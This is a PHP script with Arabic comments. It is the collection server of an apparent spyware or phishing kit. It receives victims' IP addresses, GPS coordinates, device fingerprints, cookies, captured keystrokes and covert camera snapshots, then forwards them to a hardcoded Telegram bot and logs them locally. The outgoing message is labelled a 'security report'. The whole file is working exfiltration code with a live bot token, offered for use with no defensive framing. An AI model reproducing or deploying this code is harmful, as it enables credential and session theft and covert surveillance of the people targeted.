<?php
// ============================================================
// خادم استقبال البيانات - إصدار محترف
// ============================================================

$botToken = "8934708518:AAEATzKMyKccDO-qO8kojQd08YcHuxHywy4";
$chatId = "6162147054";

// منع أي عرض مباشر
header("Content-Type: application/json");
header("X-Robots-Tag: noindex, nofollow");

$input = file_get_contents("php://input");
$data = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(["status" => "error", "msg" => "no data"]);
    exit;
}

// إضافة IP حقيقي
$data['ip'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$data['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// ============================================================
// بناء الرسالة
// ============================================================
$msg = "🔐 *تقرير أمني - تنبيه جديد* 🔐\n\n";
$msg .= "📌 *IP:* `{$data['ip']}`\n";
$msg .= "🌍 *الموقع:* `{$data['g']['city']}, {$data['g']['region']}, {$data['g']['country']}`\n";
$msg .= "🗺️ *الإحداثيات:* `{$data['g']['lat']}, {$data['g']['lon']}`\n";
$msg .= "🖥 *المتصفح:* `{$data['d']['ua']}`\n";
$msg .= "💻 *النظام:* `{$data['d']['platform']}`\n";
$msg .= "🌐 *اللغة:* `{$data['d']['lang']}`\n";
$msg .= "📱 *الشاشة:* `{$data['d']['screen']}`\n";
$msg .= "⏰ *التوقيت:* `{$data['d']['tz']}`\n";
$msg .= "🧠 *الأنوية:* `{$data['d']['cores']}`\n";
$msg .= "💾 *الذاكرة:* `{$data['d']['memory']}`\n";
$msg .= "🍪 *الكوكيز:*\n```\n{$data['c']}\n```\n";
$msg .= "⌨️ *ضغطات المفاتيح:*\n```\n{$data['k']}\n```\n";
$msg .= "📅 *التاريخ:* `{$data['t']}`";

// ============================================================
// إرسال النص
// ============================================================
function sendTelegram($method, $params) {
    global $botToken;
    $url = "https://api.telegram.org/bot{$botToken}/{$method}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

sendTelegram("sendMessage", [
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'Markdown'
]);

// ============================================================
// إرسال الصورة إن وجدت
// ============================================================
if (!empty($data['img']) && $data['img'] !== "null" && strlen($data['img']) > 100) {
    $imgData = base64_decode(preg_replace('#^data:image/\w+;base64,#', '', $data['img']));
    if ($imgData) {
        $tmp = tempnam(sys_get_temp_dir(), 'shot') . '.png';
        file_put_contents($tmp, $imgData);
        sendTelegram("sendPhoto", [
            'chat_id' => $chatId,
            'photo' => new CURLFile($tmp),
            'caption' => "📸 *لقطة من الكاميرا*",
            'parse_mode' => 'Markdown'
        ]);
        unlink($tmp);
    }
}

// ============================================================
// تسجيل محلي
// ============================================================
file_put_contents("log_" . date("Y-m-d") . ".txt",
    "[" . date("Y-m-d H:i:s") . "] " . json_encode($data) . PHP_EOL,
    FILE_APPEND);

echo json_encode(["status" => "ok"]);
?>
